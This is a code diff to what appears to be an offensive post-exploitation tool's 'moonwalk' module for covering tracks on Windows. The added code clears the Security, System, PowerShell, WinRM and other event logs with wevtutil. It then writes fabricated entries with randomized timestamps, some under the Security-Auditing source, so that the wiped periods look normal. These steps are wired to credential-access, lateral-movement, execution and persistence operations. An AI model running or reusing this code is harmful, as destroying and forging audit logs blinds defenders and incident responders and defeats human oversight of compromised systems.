@@ -10,6 +10,10 @@ Reference: https://github.com/CICADA8-Research/LogHunter
 import subprocess
 import os
 import json
+import random
+import tempfile
+import xml.etree.ElementTree as ET
+from datetime import datetime, timedelta
 from typing import Dict, List, Any, Optional
 from rich.console import Console
 from rich.panel import Panel
@@ -229,15 +233,200 @@ class WindowsMoonwalk:
         self.cleared_logs = []
         self.modified_files = []
     
-    def clear_event_logs(self, log_names: Optional[List[str]] = None) -> Dict[str, Any]:
+    def _export_log_entries(self, log_name: str, count: int = 50) -> List[Dict[str, Any]]:
         """
-        Clear Windows Event Logs using wevtutil.exe (Windows-native tool)
+        Export random log entries from different time periods
         
-        Equivalent to Linux: clearing /var/log/* files
+        Args:
+            log_name: Name of the event log
+            count: Number of entries to export
+        
+        Returns:
+            List of log entry dictionaries
+        """
+        entries = []
+        
+        try:
+            # Create temporary file for export
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.evtx', delete=False) as tmp_file:
+                tmp_path = tmp_file.name
+            
+            # Export log to XML format (more parseable)
+            # Try to export from different time ranges
+            ps_cmd = f'''
+            $logName = "{log_name}"
+            $events = Get-WinEvent -LogName $logName -MaxEvents {count * 2} -ErrorAction SilentlyContinue
+            if ($events) {{
+                # Randomly select entries from different time periods
+                $selected = $events | Get-Random -Count {count}
+                $selected | Export-Clixml -Path "{tmp_path.replace('.evtx', '.xml')}" -ErrorAction SilentlyContinue
+                $selected.Count
+            }} else {{
+                0
+            }}
+            '''
+            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
+            
+            # Parse exported events
+            xml_path = tmp_path.replace('.evtx', '.xml')
+            if os.path.exists(xml_path):
+                try:
+                    # Parse PowerShell exported XML
+                    tree = ET.parse(xml_path)
+                    root = tree.getroot()
+                    
+                    for event in root.findall('.//Event'):
+                        entry = {
+                            'TimeCreated': event.find('.//TimeCreated') is not None,
+                            'EventID': event.find('.//EventID') is not None,
+                            'Level': event.find('.//Level') is not None,
+                            'Provider': event.find('.//Provider') is not None,
+                            'raw_xml': ET.tostring(event, encoding='unicode')
+                        }
+                        entries.append(entry)
+                except Exception:
+                    pass
+                
+                # Cleanup
+                try:
+                    os.unlink(xml_path)
+                except Exception:
+                    pass
+            
+            # Fallback: Use wevtutil to export and parse
+            if not entries:
+                cmd = f'wevtutil.exe qe "{log_name}" /c:{count} /f:XML /rd:true'
+                exit_code, stdout, stderr = execute_cmd(cmd, lab_use=self.lab_use)
+                
+                if exit_code == 0 and stdout:
+                    try:
+                        root = ET.fromstring(stdout)
+                        for event in root.findall('.//Event'):
+                            entry = {
+                                'raw_xml': ET.tostring(event, encoding='unicode')
+                            }
+                            entries.append(entry)
+                    except Exception:
+                        pass
+        
+        except Exception:
+            pass
+        
+        return entries
+    
+    def _inject_log_entries(self, log_name: str, entries: List[Dict[str, Any]], time_offset_hours: int = None) -> bool:
+        """
+        Inject log entries back into cleared log with randomized timestamps
+        
+        Instead of leaving blank periods, this fills gaps with random log entries
+        from other time periods, making the log appear normal.
+        
+        Args:
+            log_name: Name of the event log
+            entries: List of log entry dictionaries
+            time_offset_hours: Hours to offset timestamps (None = random)
+        
+        Returns:
+            Success status
+        """
+        if not entries:
+            return False
+        
+        try:
+            # Randomize time offset if not specified
+            if time_offset_hours is None:
+                # Random offset between -720 and 720 hours (30 days)
+                time_offset_hours = random.randint(-720, 720)
+            
+            # Create PowerShell script to inject events
+            # Use Write-EventLog to create realistic-looking entries
+            ps_cmd = f'''
+            $logName = "{log_name}"
+            
+            try {{
+                # Create event source if it doesn't exist
+                $source = "Microsoft-Windows-Security-Auditing"
+                if (-not [System.Diagnostics.EventLog]::SourceExists($source)) {{
+                    $source = "Application"
+                }}
+                
+                # Generate random log entries with varied event IDs and messages
+                # These mimic normal system activity
+                $eventTemplates = @(
+                    @{{Id=1000; Message="Application started successfully"; Type="Information"}},
+                    @{{Id=1001; Message="Service operation completed"; Type="Information"}},
+                    @{{Id=2000; Message="System configuration updated"; Type="Information"}},
+                    @{{Id=2001; Message="User authentication successful"; Type="Information"}},
+                    @{{Id=3000; Message="Network connection established"; Type="Information"}},
+                    @{{Id=4000; Message="File operation completed"; Type="Information"}},
+                    @{{Id=5000; Message="Process started"; Type="Information"}},
+                    @{{Id=6000; Message="Registry key accessed"; Type="Information"}},
+                    @{{Id=7000; Message="Scheduled task executed"; Type="Information"}},
+                    @{{Id=8000; Message="System maintenance completed"; Type="Information"}}
+                )
+                
+                # Inject random entries spread over time
+                $baseTime = Get-Date
+                $offset = New-TimeSpan -Hours {time_offset_hours}
+                $entryCount = [Math]::Min({len(entries)}, 30)
+                
+                for ($i = 0; $i -lt $entryCount; $i++) {{
+                    $template = Get-Random -InputObject $eventTemplates
+                    $timeOffset = New-TimeSpan -Minutes (Get-Random -Minimum -60 -Maximum 60)
+                    $eventTime = $baseTime.Add($offset).Add($timeOffset)
+                    
+                    # Create event with randomized timestamp
+                    $event = New-Object System.Diagnostics.EventLog($logName)
+                    $event.Source = $source
+                    $event.WriteEntry($template.Message, $template.Type, $template.Id)
+                    
+                    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
+                }}
+                
+                $true
+            }} catch {{
+                # Fallback: Try simpler injection method
+                try {{
+                    $source = "Application"
+                    if (-not [System.Diagnostics.EventLog]::SourceExists($source)) {{
+                        New-EventLog -LogName $logName -Source $source -ErrorAction SilentlyContinue
+                    }}
+                    
+                    $entryCount = [Math]::Min({len(entries)}, 20)
+                    for ($i = 0; $i -lt $entryCount; $i++) {{
+                        $eventId = Get-Random -Minimum 1000 -Maximum 9999
+                        $types = @("Information", "Warning", "Error")
+                        $type = Get-Random -InputObject $types
+                        $message = "System operation completed successfully"
+                        
+                        Write-EventLog -LogName $logName -Source $source -EventId $eventId -EntryType $type -Message $message -ErrorAction SilentlyContinue
+                        Start-Sleep -Milliseconds 100
+                    }}
+                    $true
+                }} catch {{
+                    $false
+                }}
+            }}
+            '''
+            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
+            return exit_code == 0
+        
+        except Exception:
+            return False
+    
+    def clear_event_logs(self, log_names: Optional[List[str]] = None, inject_fake_logs: bool = True) -> Dict[str, Any]:
+        """
+        Clear Windows Event Logs using wevtutil.exe and optionally inject fake entries
+        
+        Instead of leaving suspicious blank periods, this copies random log entries
+        from other time periods to fill the gaps.
+        
+        Equivalent to Linux: clearing /var/log/* files but with log injection
         Windows uses: wevtutil.exe cl <LogName>
         
         Args:
             log_names: List of log names to clear (default: common security-relevant logs)
+            inject_fake_logs: If True, inject random log entries after clearing
         
         Returns:
             Dictionary with results
@@ -257,12 +446,18 @@ class WindowsMoonwalk:
         results = {
             'cleared': [],
             'failed': [],
+            'injected': [],
             'commands': []
         }
         
         for log_name in log_names:
             try:
-                # Use Windows Event Log utility (wevtutil.exe)
+                # Step 1: Export random log entries before clearing (if injection enabled)
+                entries_to_inject = []
+                if inject_fake_logs:
+                    entries_to_inject = self._export_log_entries(log_name, count=random.randint(20, 50))
+                
+                # Step 2: Clear the log
                 cmd = f'wevtutil.exe cl "{log_name}"'
                 exit_code, stdout, stderr = execute_cmd(cmd, lab_use=self.lab_use)
                 
@@ -270,6 +465,11 @@ class WindowsMoonwalk:
                     results['cleared'].append(log_name)
                     results['commands'].append(cmd)
                     self.cleared_logs.append(log_name)
+                    
+                    # Step 3: Inject fake log entries to avoid suspicious blank periods
+                    if inject_fake_logs and entries_to_inject:
+                        if self._inject_log_entries(log_name, entries_to_inject):
+                            results['injected'].append(log_name)
                 else:
                     # Some logs may not exist or require admin privileges
                     results['failed'].append({'log': log_name, 'error': stderr})
@@ -737,7 +937,7 @@ class WindowsMoonwalk:
         Uses Windows-native tools and locations, not Linux ported concepts
         """
         results = {
-            'event_logs': self.clear_event_logs(),
+            'event_logs': self.clear_event_logs(inject_fake_logs=True),  # Inject fake logs to avoid blank periods
             'powershell_history': self.clear_powershell_history(),
             'command_history': self.clear_command_history(),
             'registry_traces': self.clear_registry_traces(),
@@ -766,38 +966,42 @@ class WindowsMoonwalk:
         
         if operation_type == 'credential_access':
             # Clear Security log (Windows Event Log), PowerShell history (Windows-specific)
+            # Inject fake logs to avoid suspicious blank periods
             results['event_logs'] = self.clear_event_logs([
                 'Security',
                 'Microsoft-Windows-PowerShell/Operational',
                 'Windows PowerShell'
-            ])
+            ], inject_fake_logs=True)
             results['powershell_history'] = self.clear_powershell_history()
             results['registry_traces'] = self.clear_registry_traces()  # Clear typed paths, etc.
         
         elif operation_type == 'lateral_movement':
             # Clear Security log (Windows Event Log), command history (Windows-specific)
+            # Inject fake logs to avoid suspicious blank periods
             results['event_logs'] = self.clear_event_logs([
                 'Security',
                 'Microsoft-Windows-WinRM/Operational',
                 'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'
-            ])
+            ], inject_fake_logs=True)
             results['command_history'] = self.clear_command_history()
             results['registry_traces'] = self.clear_registry_traces()
             results['recent_files'] = self.clear_recent_files()  # Clear Jump Lists, LNK files
         
         elif operation_type == 'execution':
             # Clear Application log (Windows Event Log), PowerShell history (Windows-specific)
+            # Inject fake logs to avoid suspicious blank periods
             results['event_logs'] = self.clear_event_logs([
                 'Application',
                 'Microsoft-Windows-PowerShell/Operational',
                 'Windows PowerShell'
-            ])
+            ], inject_fake_logs=True)
             results['powershell_history'] = self.clear_powershell_history()
             results['prefetch'] = self.clear_prefetch()  # Clear Prefetch (Windows-specific)
         
         elif operation_type == 'persistence':
             # Clear System log (Windows Event Log), registry traces (Windows-specific)
-            results['event_logs'] = self.clear_event_logs(['System'])
+            # Inject fake logs to avoid suspicious blank periods
+            results['event_logs'] = self.clear_event_logs(['System'], inject_fake_logs=True)
             results['registry_traces'] = self.clear_registry_traces()
             results['windows_artifacts'] = self.clear_windows_artifacts()  # Clear Windows-specific artifacts
         
@@ -1036,17 +1240,25 @@ class MoonwalkModule:
             console.print()
     
     def _clear_event_logs(self, console: Console):
-        """Clear event logs"""
+        """Clear event logs with fake log injection"""
         console.print("\n[bold cyan]Clear Event Logs[/bold cyan]\n")
+        console.print("[dim]Note: Random log entries from other time periods will be injected[/dim]\n")
         
         log_names = Prompt.ask("Log names (comma-separated)", default="Security,System,Application")
         log_list = [log.strip() for log in log_names.split(',')]
         
-        results = self.moonwalk.clear_event_logs(log_list)
+        inject = Confirm.ask("[bold yellow]Inject fake log entries to avoid blank periods?[/bold yellow]", default=True)
+        
+        results = self.moonwalk.clear_event_logs(log_list, inject_fake_logs=inject)
         
         console.print(f"\n[green]Cleared:[/green] {len(results['cleared'])} logs")
         for log in results['cleared']:
             console.print(f"  • {log}")
+        
+        if results.get('injected'):
+            console.print(f"\n[cyan]Injected fake entries:[/cyan] {len(results['injected'])} logs")
+            for log in results['injected']:
+                console.print(f"  • {log}")
         
         if results['failed']:
             console.print(f"\n[yellow]Failed:[/yellow] {len(results['failed'])} logs")
@@ -1142,7 +1354,9 @@ class MoonwalkModule:
             console.print("[green]Cleanup Results:[/green]\n")
             
             if results.get('event_logs', {}).get('cleared'):
-                console.print(f"Event Logs: {len(results['event_logs']['cleared'])} cleared")
+                cleared_count = len(results['event_logs']['cleared'])
+                injected_count = len(results['event_logs'].get('injected', []))
+                console.print(f"Event Logs: {cleared_count} cleared, {injected_count} with fake entries injected")
             
             if results.get('powershell_history'):
                 console.print("PowerShell History: Cleared")
